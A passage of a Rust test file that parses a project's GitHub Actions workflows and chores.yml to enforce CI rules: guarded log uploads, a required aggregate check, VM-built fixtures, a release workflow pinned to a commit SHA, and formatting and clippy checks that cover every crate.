        // a red job green — and without `if: always()` GitHub skips it
        // whenever an earlier step failed, which is the only time it is
        // worth having. The blanket ban therefore made the quiet suite's
        // logs unkeepable on exactly the runs that need them.
        //
        // `continue-on-error:` is still refused everywhere: on a `uses:`
        // step it says an upload that failed does not matter, which is a
        // different claim and not one this workflow makes.
        let commands = !run_of(step).is_empty();
        let offending: Vec<&str> = keys
            .iter()
            .map(String::as_str)
            .filter(|k| match *k {
                "if" => commands,
                "continue-on-error" => true,
                _ => false,
            })
            .collect();
        assert!(
            offending.is_empty(),
            "{workflow} jobs.{name} step {at} ({:?}) carries {offending:?}: a step that \
             runs a command must not be conditional or allowed to fail",
            field(step, "name")
                .and_then(Yaml::as_str)
                .unwrap_or(run_of(step))
        );
    }
}

/// Whether some step of `steps` runs `chore <task>`.
fn runs_chore(steps: &[Yaml], task: &str) -> bool {
    steps
        .iter()
        .any(|step| chore_invocations(run_of(step)).iter().any(|t| t == task))
}

/// Whether running `chore <task>` reaches `scripts/tier.sh` -- the one
/// thing that writes `tmp/logs/<tier>.log` -- following `task:` items
/// and `"{{.CHORE_EXE}}" <task>` commands down. A task naming itself
/// does not loop.
fn chore_writes_a_tier_log(
    tasks: &std::collections::BTreeMap<String, ChoreTask>,
    task: &str,
    path: &mut Vec<String>,
) -> bool {
    if path.iter().any(|on_path| on_path == task) {
        return false;
    }
    let Some(body) = tasks.get(task) else {
        panic!(
            "`chore {task}` names no task in chores.yml. Its tasks: {:?}",
            tasks.keys().collect::<Vec<_>>()
        );
    };
    path.push(task.to_string());
    let writes = body.cmds.iter().any(|cmd| match cmd {
        ChoreCmd::Shell { command, .. } => {
            command.contains("scripts/tier.sh")
                // A task re-entering chore spells it `"{{.CHORE_EXE}}"`.
                || chore_invocations(&command.replace("\"{{.CHORE_EXE}}\"", "chore"))
                    .iter()
                    .any(|next| chore_writes_a_tier_log(tasks, next, path))
        }
        ChoreCmd::Task { name, .. } => chore_writes_a_tier_log(tasks, name, path),
        ChoreCmd::Other => false,
    });
    path.pop();
    writes
}

/// UPLOADS THAT REFUSE AN EMPTY PATH MUST WAIT FOR THE STEP THAT FILLS
/// IT (#306).
///
/// Every conditional `actions/upload-artifact` step in `workflow` with
/// `if-no-files-found: error`, whose `if:` does not require an EARLIER
/// step of the same job -- one that writes a tier log, directly or
/// through a `chore` task in `chores` -- to have run:
/// `steps.<id>.outcome != 'skipped'` (or `.conclusion`).
///
/// `if: always()` alone uploads after a job that died in setup, the
/// sibling checkout, the fixture download or lint, before any tier
/// wrote `tmp/logs/*.log`. The upload then finds nothing and adds a
/// second red step that hides the first -- the real cause. An upload
/// with no `if:` runs only when every earlier step succeeded, so it
/// cannot reach that state and is not reported.
fn unguarded_log_uploads(workflow: &str, chores: &str) -> Vec<String> {
    let tasks = parse_chores(chores);
    let document = load_document(workflow, Path::new("workflow"));
    let mut found = Vec::new();
    let Some(jobs) = field(&document, "jobs").and_then(Yaml::as_mapping) else {
        return found;
    };
    for (name, job) in jobs.iter() {
        let Some(name) = name.as_str() else { continue };
        let Some(steps) = field(job, "steps").and_then(Yaml::as_sequence) else {
            continue;
        };
        for (at, step) in steps.iter().enumerate() {
            let is_upload = field(step, "uses")
                .and_then(Yaml::as_str)
                .is_some_and(|uses| uses.starts_with("actions/upload-artifact@"));
            let refuses_empty = field(step, "with")
                .and_then(|with| field(with, "if-no-files-found"))
                .and_then(Yaml::as_str)
                == Some("error");
            let Some(condition) = field(step, "if").and_then(Yaml::as_str) else {
                continue;
            };
            if !is_upload || !refuses_empty {
                continue;
            }
            let condition: String = condition.split_whitespace().collect();
            let waits = steps[..at].iter().any(|earlier| {
                let Some(id) = field(earlier, "id").and_then(Yaml::as_str) else {
                    return false;
                };
                let script = run_of(earlier);
                let writes = script.contains("scripts/tier.sh")
                    || chore_invocations(script)
                        .iter()
                        .any(|task| chore_writes_a_tier_log(&tasks, task, &mut Vec::new()));
                writes
                    && ["outcome", "conclusion"].iter().any(|result| {
                        condition.contains(&format!("steps.{id}.{result}!='skipped'"))
                    })
            });
            if !waits {
                found.push(format!(
                    "jobs.{name} step {at} ({}) uploads with `if-no-files-found: error` under \
                     `if: {}` without waiting for a tier step to have run",
                    field(step, "name")
                        .and_then(Yaml::as_str)
                        .unwrap_or("unnamed"),
                    field(step, "if").and_then(Yaml::as_str).unwrap_or("")
                ));
            }
        }
    }
    found
}

/// Every workflow's tier-log uploads wait for their tier (#306).
#[test]
fn a_log_upload_that_refuses_an_empty_path_waits_for_its_tier_to_run() {
    let chores = read_or_panic(&manifest_dir().join("chores.yml"));
    let mut offending = Vec::new();
    for workflow in ["ci.yml", "release.yml", "fuzz.yml"] {
        let path = workflow_path(workflow);
        let text = read_or_panic(&path);
        offending.extend(
            unguarded_log_uploads(&text, &chores)
                .into_iter()
                .map(|found| format!("{workflow}: {found}")),
        );
    }
    assert!(
        offending.is_empty(),
        "a job that fails before any tier runs has no tmp/logs/*.log, so these uploads add \
         a second red step that hides the real failure. Give the tier step an `id:` and \
         upload `if: always() && steps.<id>.outcome != 'skipped'`:\n{}",
        offending.join("\n")
    );
}

/// THE PULL-REQUEST GATE'S SHAPE, now that every job runs chore tasks.
///
/// - `fixtures` builds the kernel-made images ONCE, in the
///   fs-linux-test-harness VM under KVM, on an x86_64 runner, and uploads
///   them. They are disk images, the same for every architecture.
/// - `test` runs on BOTH native architectures -- aarch64 matters on its
///   own: `c_char` is unsigned there, and Apple Silicon hosts run on it
///   -- and downloads those images rather than building them, because
///   GitHub's arm64 runners have no KVM. So no step of it may start a VM.
/// - `unit` runs the tier that needs no tool and no fixture, which is
///   where the overflow handshake lives (the guard above).
/// - `ci-ok` is the one required check. It runs `if: always()` and must
///   need EVERY other job: a job it does not wait on can fail, or be
///   skipped, under a green required check. The set is computed from the
///   parsed jobs, so adding a job and forgetting ci-ok fails here.
///
/// And the tasks those jobs run must still be what they say:
/// `chore test` is unit, the tool and fixture checks, the whole suite in
/// release, and the script tests; `chore lint` is clippy with warnings
/// denied.
/// A pull request gets CI whatever it is based on (#132).
#[test]
fn ci_runs_on_a_pull_request_against_any_base() {
    let path = workflow_path("ci.yml");
    let text = read_or_panic(&path);
    let document = load_document(&text, &path);
    let filter = pull_request_branch_filter(&document);
    assert!(
        filter.is_empty(),
        "ci.yml runs on pull requests only against {filter:?}. A pull request based on \
         anything else — a stacked one, which this repository uses routinely — runs no \
         CI at all, and still collects its review-bot ticks, so it reads as verified."
    );
}

#[test]
fn the_pr_gate_builds_fixtures_once_in_the_harness_vm_and_tests_both_architectures_through_chore() {
    let path = workflow_path("ci.yml");
    let text = read_or_panic(&path);
    let document = load_document(&text, &path);

    // jobs.test — x86_64, where GitHub gives us KVM, so the oracles and
    // the kernel tests can run at all.
    let test = job(&document, "test", &path);
    assert_unconditional(test, "test", "ci.yml");
    let runner = field(test, "runs-on").and_then(Yaml::as_str).unwrap_or("");
    assert!(
        runner.starts_with("ubuntu-") && !runner.contains("arm"),
        "jobs.test must run on an x86_64 ubuntu runner: the oracle tools and the kernel \
         oracles run in a VM, and only those runners have KVM; got {runner:?}"
    );
    assert!(
        needs_of(test).iter().any(|n| n == "fixtures"),
        "jobs.test must need jobs.fixtures, whose artifact it tests against"
    );
    let steps = steps_of(test, "test");
    for task in ["tools", "lint", "test"] {
        assert!(
            runs_chore(steps, task),
            "jobs.test does not run `chore {task}`"
        );
    }
    assert!(
        steps
            .iter()
            .any(|step| run_of(step).contains("ci-setup-linux.sh")),
        "jobs.test must set the VM host up with the harness's ci-setup-linux.sh: every \
         oracle tool call and every kernel mount happens in that VM"
    );
    assert!(
        steps
            .iter()
            .any(|step| is_artifact_step(step, "download-artifact", "fixtures")),
        "jobs.test must download the `fixtures` artifact the fixtures job built"
    );
    // NOTHING INSTALLS THE ORACLE TOOLS ON THE RUNNER, and the job proves
    // it rather than claiming it.
    assert!(
        steps.iter().all(|step| !run_of(step).contains("e2fsprogs")),
        "jobs.test must not install e2fsprogs on the runner: the tools live in the VM"
    );
    let debugger = ["debug", "fs"].concat();
    assert!(
        steps
            .iter()
            .any(|step| run_of(step).contains(&debugger) && run_of(step).contains("::error::")),
        "jobs.test must make the runner's own oracle tools UNUSABLE before the tests \
         run — they cannot be uninstalled, they are essential — so that a green run is \
         evidence every call went to the guest rather than a claim that it did"
    );

    // jobs.test-arm64 — the architecture the driver ships on, on a runner
    // with no KVM: the tiers that need no VM.
    let arm = job(&document, "test-arm64", &path);
    assert_unconditional(arm, "test-arm64", "ci.yml");
    assert_eq!(
        field(arm, "runs-on").and_then(Yaml::as_str),
        Some("ubuntu-24.04-arm"),
        "jobs.test-arm64 must run on GitHub's arm64 runner"
    );
    let arm_steps = steps_of(arm, "test-arm64");
    for task in ["lint", "test:unit", "test:images"] {
        assert!(
            runs_chore(arm_steps, task),
            "jobs.test-arm64 does not run `chore {task}`"
        );
    }
    for step in arm_steps {
        let run = run_of(step);
        assert!(
            !run.contains("qemu-system-") && !run.contains("ci-setup-linux.sh"),
            "GitHub's arm64 runners have no KVM, so jobs.test-arm64 must not start a VM: \
             {run:?}"
        );
    }

    // jobs.suite-in-vm — the whole suite built and run INSIDE the guest,
    // which is how a host that is not Linux runs it.
    let in_vm = job(&document, "suite-in-vm", &path);
    assert_unconditional(in_vm, "suite-in-vm", "ci.yml");
    let in_vm_steps = steps_of(in_vm, "suite-in-vm");
    assert!(
        runs_chore(in_vm_steps, "test:vm"),
        "jobs.suite-in-vm must run `chore test:vm`, or the in-guest path rots unnoticed"
    );
    assert!(
        in_vm_steps
            .iter()
            .any(|step| run_of(step).contains("ci-setup-linux.sh")),
        "jobs.suite-in-vm must set the VM host up with the harness's ci-setup-linux.sh"
    );

    // jobs.fixtures
    let fixtures = job(&document, "fixtures", &path);
    assert_unconditional(fixtures, "fixtures", "ci.yml");
    let runner = field(fixtures, "runs-on")
        .and_then(Yaml::as_str)
        .unwrap_or("");
    assert!(
        runner.starts_with("ubuntu-") && !runner.contains("arm"),
        "jobs.fixtures must run on an x86_64 ubuntu runner, where KVM is available; got \
         {runner:?}"
    );
    let steps = steps_of(fixtures, "fixtures");
    let setup = steps
        .iter()
        .position(|step| run_of(step).contains("ci-setup-linux.sh"))
        .unwrap_or_else(|| {
            panic!("jobs.fixtures must set the VM host up with the harness's ci-setup-linux.sh")
        });
    let build = steps
        .iter()
        .position(|step| {
            chore_invocations(run_of(step))
                .iter()
                .any(|t| t == "fixtures")
        })
        .unwrap_or_else(|| panic!("jobs.fixtures must run `chore fixtures`"));
    assert!(
        setup < build,
        "jobs.fixtures must set up the VM host before `chore fixtures` needs it"
    );
    assert!(
        steps
            .iter()
            .any(|step| is_artifact_step(step, "upload-artifact", "fixtures")),
        "jobs.fixtures must upload the images as the `fixtures` artifact"
    );

    // jobs.unit
    let unit = job(&document, "unit", &path);
    assert_unconditional(unit, "unit", "ci.yml");
    assert!(
        runs_chore(steps_of(unit, "unit"), "test:unit"),
        "jobs.unit must run `chore test:unit`"
    );

    // jobs.ci-ok
    let ci_ok = job(&document, "ci-ok", &path);
    assert_eq!(
        field(ci_ok, "if").and_then(Yaml::as_str),
        Some("always()"),
        "jobs.ci-ok must run `if: always()`, or a failed job skips it and a skipped \
         required check can read as passing"
    );
    let mut others: Vec<String> = field(&document, "jobs")
        .map(keys_of)
        .unwrap_or_default()
        .into_iter()
        .filter(|name| name != "ci-ok")
        .collect();
    let mut needed = needs_of(ci_ok);
    others.sort();
    needed.sort();
    assert_eq!(
        needed, others,
        "jobs.ci-ok must need exactly every other job in ci.yml: a job it does not wait \
         on can fail under a green required check"
    );

    // chores.yml
    let chores_path = manifest_dir().join("chores.yml");
    let tasks = parse_chores(&read_or_panic(&chores_path));
    let task = |name: &str| {
        tasks
            .get(name)
            .unwrap_or_else(|| panic!("chores.yml has no `{name}` task"))
    };
    // `test` chooses between the native run and the in-guest one; the
    // native side is what the gate on a Linux runner executes.
    let dispatcher = task("test");
    assert!(
        !carries_any(&dispatcher.keys, &NON_GATING_TASK_KEYS),
        "chores.yml `test` must never be skipped as up to date or allowed to fail"
    );
    assert!(
        dispatcher.cmds.iter().any(|cmd| matches!(
            cmd,
            ChoreCmd::Shell { command, .. } if command.contains("test:vm")
        )),
        "chores.yml `test` must fall to `test:vm` on a host that is not Linux, so the \
         Linux tests always run on Linux"
    );
    let test_task = task("test:native");
    assert!(
        !carries_any(&test_task.keys, &NON_GATING_TASK_KEYS),
        "chores.yml `test` must never be skipped as up to date or allowed to fail"
    );
    let commands: Vec<&str> = test_task
        .cmds
        .iter()
        .filter_map(|cmd| match cmd {
            ChoreCmd::Shell { keys, command } if !carries_any(keys, &NON_GATING_CMD_KEYS) => {
                Some(command.as_str())
            }
            _ => None,
        })
        .collect();
    let subtasks: Vec<&str> = test_task
        .cmds
        .iter()
        .filter_map(|cmd| match cmd {
            ChoreCmd::Task { keys, name } if !carries_any(keys, &NON_GATING_CMD_KEYS) => {
                Some(name.as_str())
            }
            _ => None,
        })
        .collect();
    for subtask in [
        "test:unit",
        "test:oracle",
        "test:kernel",
        "test:lwext4",
        "test:scripts",
    ] {
        assert!(
            subtasks.contains(&subtask),
            "chores.yml `test:native` must run `task: {subtask}`; it runs {subtasks:?}"
        );
    }
    // Spelled in two pieces so this file does not name the fixture
    // directory: scripts/test-targets.sh would otherwise count it as a
    // test that needs fixtures and leave it out of `chore test:unit`.
    let fixtures_check = ["test-", "disks/build-fixtures.sh --check"].concat();
    for check in ["scripts/tools.sh --check", fixtures_check.as_str()] {
        assert!(
            commands.iter().any(|c| c.trim() == check),
            "chores.yml `test:native` must run `{check}` first, so a missing tool or fixture fails \
             once, naming the task that provides it; it runs {commands:?}"
        );
    }
    assert!(
        commands.iter().any(|c| {
            let as_cargo = c.replace(TEST_WRAPPER, "cargo test");
            as_cargo.contains("cargo test")
                && as_cargo.contains("--release")
                && !as_cargo.contains("test-targets.sh")
        }),
        "chores.yml `test:native` must run the whole suite in the release profile; it runs \
         {commands:?}"
    );
    assert!(
        task("lint").cmds.iter().any(|cmd| matches!(
            cmd,
            ChoreCmd::Shell { keys, command }
                if !carries_any(keys, &NON_GATING_CMD_KEYS)
                    && command.trim()
                        == "cargo clippy --locked --workspace --all-targets --features cli -- -D warnings"
        )),
        "chores.yml `lint` must run `cargo clippy --locked --workspace --all-targets --features cli \
         -- -D warnings`: without the feature the command-line tools are not linted at all"
    );
}

/// THE SHIPPING GATE runs the same chore tasks as the pull-request gate,
/// in one job: `ubuntu-latest` is x86_64 with KVM, so it builds the
/// fixtures itself through the harness VM -- `ci-setup-linux.sh`, then
/// `chore fixtures` -- and then runs `chore test`, unconditionally.
///
/// None of the scripts the harness replaced may come back: the native
/// sudo generator, the in-repo VM builder and e2fsck runner, and the
/// in-repo VM wrapper are deleted, and a step naming one fails on a tag,
/// after the version is committed to. And nothing ships -- neither the
/// packaged binary nor the crates.io upload -- unless `test` passed.
#[test]
fn the_release_gate_builds_fixtures_in_the_harness_vm_and_runs_chore_test() {
    let path = workflow_path("release.yml");
    let text = read_or_panic(&path);
    let document = load_document(&text, &path);
    let test = job(&document, "test", &path);
    assert_unconditional(test, "test", "release.yml");
    let steps = steps_of(test, "test");

    let setup = steps
        .iter()
        .position(|step| run_of(step).contains("ci-setup-linux.sh"))
        .unwrap_or_else(|| {
            panic!("release jobs.test must set the VM host up with the harness's ci-setup-linux.sh")
        });
    let build = steps
        .iter()
        .position(|step| {
            chore_invocations(run_of(step))
                .iter()
                .any(|t| t == "fixtures")
        })
        .unwrap_or_else(|| panic!("release jobs.test must run `chore fixtures`"));
    assert!(
        setup < build,
        "release jobs.test must set up the VM host before `chore fixtures` needs it"
    );
    assert!(
        runs_chore(steps, "test"),
        "release jobs.test must run `chore test`"
    );

    let jobs = field(&document, "jobs")
        .and_then(Yaml::as_mapping)
        .unwrap_or_else(|| panic!("{} has no jobs", path.display()));
    for (name, body) in jobs.iter() {
        for step in field(body, "steps")
            .and_then(Yaml::as_sequence)
            .into_iter()
            .flatten()
        {
            let run = run_of(step);
            for deleted in [
                "build-ext4-feature-images",
                "_vm-builder",
                "vm-e2fsck",
                "scripts/vm.sh",
            ] {
                assert!(
                    !run.contains(deleted),
                    "release.yml jobs.{} runs `{deleted}`, which is deleted: {run:?}",
                    name.as_str().unwrap_or("?")
                );
            }
        }
    }

    for shipping in ["cli", "publish"] {
        assert!(
            needs_of(job(&document, shipping, &path))
                .iter()
                .any(|n| n == "test"),
            "release jobs.{shipping} must need jobs.test: nothing ships untested"
        );
    }
}

/// The reusable workflow that packages, attests and attaches the release
/// tarball for every repository in the family.
const CORE_RELEASE_CLI: &str = "antimatter-studios/rust-fs-core/.github/workflows/release-cli.yml";

/// THE RELEASE TARBALL IS PACKAGED BY RUST-FS-CORE, NOT BY A COPY HERE
/// (#481). Every repository once carried its own `package-cli` matrix,
/// attest-and-attach job and `scripts/package-cli.sh`, and the copies
/// drifted. `release.yml` now calls core's `release-cli.yml` from one job,
/// `cli`, and keeps none of them.
///
/// The call is pinned to a commit SHA, not a tag: the called workflow runs
/// with this repository's `contents: write`, and a tag is a pointer its
/// owner can move. Its `core-ref` is the tag `chores.yml` pins the sibling
/// to, and its `toolchain` the one `rust-toolchain.toml` pins, so the
/// tarball is built from the same sources the gate tested. And it ships
/// only after `test` passed and the crate is on crates.io.
#[test]
fn the_release_tarball_is_packaged_by_core_release_cli_workflow_at_a_pinned_sha() {
    let root = manifest_dir();
    let path = workflow_path("release.yml");
    let text = read_or_panic(&path);
    let document = load_document(&text, &path);

    let cli = job(&document, "cli", &path);
    let uses = field(cli, "uses")
        .and_then(Yaml::as_str)
        .unwrap_or_else(|| panic!("release jobs.cli must call {CORE_RELEASE_CLI} with `uses:`"));
    let (workflow, sha) = uses
        .split_once('@')
        .unwrap_or_else(|| panic!("release jobs.cli calls {uses:?}, with no `@<sha>`"));
    assert_eq!(
        workflow, CORE_RELEASE_CLI,
        "release jobs.cli must call rust-fs-core's release-cli workflow"
    );
    assert!(
        sha.len() == 40
            && sha
                .bytes()
                .all(|b| b.is_ascii_digit() || (b'a'..=b'f').contains(&b)),
        "release jobs.cli calls {CORE_RELEASE_CLI} at {sha:?}, which is not a 40-hex commit SHA: \
         a tag can be moved under a job that holds a write token"
    );

    let with =
        field(cli, "with").unwrap_or_else(|| panic!("release jobs.cli passes no `with:` inputs"));
    let input = |name: &str| {
        field(with, name)
            .and_then(Yaml::as_str)
            .unwrap_or_else(|| panic!("release jobs.cli passes no `{name}` input"))
            .to_string()
    };
    let core_pin = am_fs_core_versions_declared(&read_or_panic(&root.join("chores.yml")))
        .into_iter()
        .next()
        .map(|(_, v)| v)
        .expect("chores.yml declares the am-fs-core pin");
    assert_eq!(
        input("core-ref"),
        format!("v{core_pin}"),
        "release jobs.cli must build against the rust-fs-core tag chores.yml pins"
    );
    let toolchain = read_or_panic(&root.join("rust-toolchain.toml"))
        .lines()
        .find_map(|line| quoted_value_after(line.trim(), "channel"))
        .expect("rust-toolchain.toml names its channel");
    assert_eq!(
        input("toolchain"),
        toolchain,
        "release jobs.cli must build with the toolchain rust-toolchain.toml pins"
    );

    let permissions =
        field(cli, "permissions").unwrap_or_else(|| panic!("release jobs.cli grants nothing"));
    for grant in ["contents", "id-token", "attestations"] {
        assert_eq!(
            field(permissions, grant).and_then(Yaml::as_str),
            Some("write"),
            "release jobs.cli must grant `{grant}: write`, which the attach job needs"
        );
    }
    let needs = needs_of(cli);
    for needed in ["test", "publish"] {
        assert!(
            needs.iter().any(|n| n == needed),
            "release jobs.cli must need jobs.{needed}: nothing ships untested or unpublished"
        );
    }

    // No copy of what core now does is left behind.
    for copy in [
        "scripts/package-cli.sh",
        "tests/scripts/test-package-cli.sh",
    ] {
        assert!(
            !root.join(copy).exists(),
            "{copy} is a local copy of rust-fs-core's packaging; delete it"
        );
    }
    let jobs = field(&document, "jobs")
        .and_then(Yaml::as_mapping)
        .unwrap_or_else(|| panic!("{} has no jobs", path.display()));
    for (name, body) in jobs.iter() {
        let name = name.as_str().unwrap_or("?");
        assert!(
            !["package-cli", "release"].contains(&name),
            "release.yml still has its own jobs.{name}; rust-fs-core's release-cli.yml packages \
             and attaches the tarball"
        );
        for step in field(body, "steps")
            .and_then(Yaml::as_sequence)
            .into_iter()
            .flatten()
        {
            let uses = field(step, "uses").and_then(Yaml::as_str).unwrap_or("");
            assert!(
                !run_of(step).contains("package-cli") && !uses.contains("attest-build-provenance"),
                "release.yml jobs.{name} packages or attests the tarball itself; \
                 rust-fs-core's release-cli.yml does that"
            );
        }
    }
}

/// THE DISTINCTION THIS REPOSITORY NEEDS THAT A PORTED COPY WOULD MISS.
///
/// A workflow carrying a checking debug run under a name other than
/// `ci.yml` -- `release.yml`, in this repository's own case -- must not
/// satisfy the guard. `release.yml` does carry one: its `chore test`
/// runs `task: test:unit`, handshake and all, unconditionally. That is
/// exactly the near miss worth pinning, because it does not make
/// `ci.yml`'s own absence of one acceptable: `release.yml` triggers on a
/// version tag, too late to gate a merge.
#[test]
fn a_checking_debug_run_that_is_not_in_ci_yml_does_not_satisfy_this_guard() {
    let release_yml_shape = "\
jobs:
  release:
    steps:
      - run: EXPECT_OVERFLOW_CHECKS=1 cargo test --locked --all-targets
";
    // This function only ever reads ci.yml in the real guard above; this
    // test pins that the PARSER itself would still count such a line if
    // handed the wrong file, so the guard's safety is coming from WHICH
    // FILE it opens -- a fact worth being explicit about, since a future
    // edit that widened the scan to every workflow would silently stop
    // catching this repository's actual defect.
    assert_eq!(
        checking_debug_runs(release_yml_shape),
        vec!["- run: EXPECT_OVERFLOW_CHECKS=1 cargo test --locked --all-targets".to_string()],
        "the parser itself would count this line -- the guard's correctness \
         depends on scanning ci.yml and ci.yml alone, not on the parser \
         refusing this shape"
    );

    // And release.yml's actual shape: the same run, one `chore test` away,
    // in a workflow that triggers on a tag. The resolver finds the run --
    // so the chore indirection is not what refuses it -- and the gating
    // walk refuses it for the trigger alone.
    let release_yml_via_chore = "\
on:
  push:
    tags: ['v*.*.*']
jobs:
  test:
    steps:
      - run: chore test
";
    let chores = "\
tasks:
  test:
    cmds:
      - task: test:unit
      - scripts/test.sh --locked --release
  test:unit:
    cmds:
      - 'EXPECT_OVERFLOW_CHECKS=1 scripts/test.sh --locked --lib'
";
    let tasks = parse_chores(chores);
    assert_eq!(
        chore_checking_debug_runs(&tasks, "test", &mut Vec::new()).len(),
        1,
        "the resolver itself would find the run behind `chore test`"
    );
    assert!(
        gating_checking_debug_runs_via_chore(release_yml_via_chore, chores).is_empty(),
        "a workflow that runs on a tag gates no merge, however its task resolves"
    );
    assert_eq!(
        gating_checking_debug_runs_via_chore(
            &release_yml_via_chore.replace("  push:\n    tags: ['v*.*.*']\n", "  pull_request:\n"),
            chores
        )
        .len(),
        1,
        "control: the same steps on pull_request do gate"
    );
}

/// The words of every `cargo fmt` run in `command`, from `fmt` onward.
///
/// A toolchain selector (`cargo +nightly fmt`) is not a subcommand, and
/// anything after a bare `--` is rustfmt's, not cargo's, so it is cut:
/// `cargo fmt --check -- --all` does not select every package.
fn cargo_fmt_runs(command: &str) -> Vec<Vec<String>> {
    cargo_runs(command, "fmt")
        .into_iter()
        .map(|(cargo, _)| cargo)
        .collect()
}

/// Every `cargo <subcommand>` run in `command`, as `(cargo's words from
/// the subcommand onward, the words after a bare `--`)`. The second half
/// belongs to the tool the subcommand drives -- rustfmt, or clippy's
/// lint flags -- and never selects a package.
fn cargo_runs(command: &str, subcommand: &str) -> Vec<(Vec<String>, Vec<String>)> {
    let mut runs = Vec::new();
    for raw in command.lines() {
        let line = raw.trim_start();
        if line.starts_with('#') {
            continue;
        }
        let line = line.split(" #").next().unwrap_or(line);
        for words in shell_commands(line) {
            let mut words = words
                .into_iter()
                .skip_while(|w| w.contains('=') && !w.starts_with('-'));
            let Some(program) = words.next() else {
                continue;
            };
            if program != "cargo" && !program.ends_with("/cargo") {
                continue;
            }
            let mut rest = words.skip_while(|w| w.starts_with('+'));
            if rest.next().as_deref() != Some(subcommand) {
                continue;
            }
            let rest: Vec<String> = rest.collect();
            let split = rest.iter().position(|w| w == "--").unwrap_or(rest.len());
            let cargo = std::iter::once(subcommand.to_string())
                .chain(rest[..split].iter().cloned())
                .collect();
            let tool = rest.get(split + 1..).unwrap_or_default().to_vec();
            runs.push((cargo, tool));
        }
    }
    runs
}

/// The gating shell commands chore runs for `task`, following `task:`
/// items down. A task or item chore may skip, or whose failure it
/// discards, contributes nothing -- as in [`chore_checking_debug_runs`],
/// and a task that does not exist is a panic for the same reason.
fn chore_gating_commands(
    tasks: &std::collections::BTreeMap<String, ChoreTask>,
    task: &str,
    path: &mut Vec<String>,
) -> Vec<String> {
    if path.iter().any(|on_path| on_path == task) {
        return Vec::new();
    }
    let Some(body) = tasks.get(task) else {
        panic!(
            "`chore {task}` names no task in chores.yml. Its tasks: {:?}",
            tasks.keys().collect::<Vec<_>>()
        );
    };
    if carries_any(&body.keys, &NON_GATING_TASK_KEYS) {
        return Vec::new();
    }
    path.push(task.to_string());
    let mut out = Vec::new();
    for cmd in &body.cmds {
        match cmd {
            ChoreCmd::Shell { keys, command } if !carries_any(keys, &NON_GATING_CMD_KEYS) => {
                out.push(command.clone());
            }
            ChoreCmd::Task { keys, name } if !carries_any(keys, &NON_GATING_CMD_KEYS) => {
                out.extend(chore_gating_commands(tasks, name, path));
            }
            _ => {}
        }
    }
    path.pop();
    out
}

/// The formatting check `chore lint` runs, as `(checks, missing_all)`:
/// every gating `cargo fmt --check`, and those among them that check
/// only the root package.
fn lint_fmt_checks(chores: &str) -> (Vec<String>, Vec<String>) {
    let tasks = parse_chores(chores);
    let mut checks = Vec::new();
    let mut missing_all = Vec::new();
    for command in chore_gating_commands(&tasks, "lint", &mut Vec::new()) {
        for run in cargo_fmt_runs(&command) {
            if !run.iter().any(|w| w == "--check") {
                continue;
            }
            let shown = format!("cargo {}", run.join(" "));
            if !run.iter().any(|w| w == "--all") {
                missing_all.push(shown.clone());
            }
            checks.push(shown);
        }
    }
    (checks, missing_all)
}

/// THE FORMATTING GATE COVERS EVERY CRATE IN THIS TREE (#367).
///
/// `tests/support` -- the oracle and verdict machinery every test
/// reaches its oracles through -- is a path dependency, not the root
/// package. `cargo fmt --check` checks the root package only, so that
/// crate sat unformatted on `main` with the gate green. `--all` is what
/// reaches local path dependencies. CI runs `chore lint`, so this reads
/// the task, not the workflow.
#[test]
fn the_lint_formatting_check_covers_every_local_crate() {
    let chores = read_or_panic(&manifest_dir().join("chores.yml"));
    let (checks, missing_all) = lint_fmt_checks(&chores);
    assert!(
        !checks.is_empty(),
        "`chore lint` runs no gating `cargo fmt --check`, so nothing checks formatting at all"
    );
    assert!(
        missing_all.is_empty(),
        "`chore lint` checks formatting without `--all`, which leaves every local path \
         dependency (tests/support) unchecked: {missing_all:?}"
    );
}

mod lint_fmt {
    use super::lint_fmt_checks;

    fn lint(cmds: &str) -> (Vec<String>, Vec<String>) {
        lint_fmt_checks(&format!("tasks:\n  lint:\n    cmds:\n{cmds}"))
    }

    #[test]
    fn a_check_of_the_root_package_only_is_refused() {
        let (checks, missing) = lint("      - cargo fmt --check\n");
        assert_eq!(checks, vec!["cargo fmt --check"]);
        assert_eq!(missing, vec!["cargo fmt --check"]);
    }

    #[test]
    fn a_check_of_every_package_is_accepted() {
        let (checks, missing) = lint("      - cargo fmt --all --check\n");
        assert_eq!(checks, vec!["cargo fmt --all --check"]);
        assert!(missing.is_empty());
    }

    /// Past `--` the words are rustfmt's, and rustfmt has no `--all`.
    #[test]
    fn an_all_handed_to_rustfmt_does_not_count() {
        let (_, missing) = lint("      - cargo fmt --check -- --all\n");
        assert_eq!(missing, vec!["cargo fmt --check"]);
    }

    #[test]
    fn a_toolchain_selector_is_not_the_subcommand() {
        let (checks, missing) = lint("      - cargo +stable fmt --check\n");
        assert_eq!(checks.len(), 1);
        assert_eq!(missing.len(), 1);
    }

    /// A check chore may discard is not a check.
    #[test]
    fn a_check_whose_failure_is_ignored_does_not_count() {
        let (checks, _) =
            lint("      - cmd: cargo fmt --all --check\n        ignore_error: true\n");
        assert!(checks.is_empty());
    }

    /// Followed through `task:` items, as chore runs them.
    #[test]
    fn a_check_in_a_task_lint_calls_is_found() {
        let (checks, missing) = lint_fmt_checks(
            "tasks:\n  lint:\n    cmds:\n      - task: fmt\n  fmt:\n    cmds:\n      - cargo fmt --check\n",
        );
        assert_eq!(checks.len(), 1);
        assert_eq!(missing.len(), 1);
    }

    /// Formatting in place is not a check, and a comment is not a command.
    #[test]
    fn formatting_in_place_and_comments_are_not_checks() {
        let (checks, _) = lint("      - cargo fmt\n      - '# cargo fmt --all --check'\n");
        assert!(checks.is_empty());
    }
}

/// The clippy check `chore lint` runs, as `(checks, missing_workspace)`:
/// every gating `cargo clippy` that denies warnings, and those among
/// them that lint only the root package.
///
/// Clippy has no `fmt --all`: its lints reach workspace members and
/// nothing else, so a local path dependency is linted only once it is a
/// member AND the run selects every member. The second half is asserted
/// here; the first against `cargo metadata` in the test below.
fn lint_clippy_checks(chores: &str) -> (Vec<String>, Vec<String>) {
    let tasks = parse_chores(chores);
    let mut checks = Vec::new();
    let mut missing_workspace = Vec::new();
    for command in chore_gating_commands(&tasks, "lint", &mut Vec::new()) {
        for (run, lints) in cargo_runs(&command, "clippy") {
            let denies_warnings = lints
                .windows(2)
                .any(|w| (w[0] == "-D" || w[0] == "--deny") && w[1] == "warnings")
                || lints.iter().any(|w| w == "-Dwarnings");
            if !denies_warnings {
                continue;
            }
            let shown = format!("cargo {}", run.join(" "));
            if !run.iter().any(|w| w == "--workspace" || w == "--all") {
                missing_workspace.push(shown.clone());
            }
            checks.push(shown);
        }
    }
    (checks, missing_workspace)
}

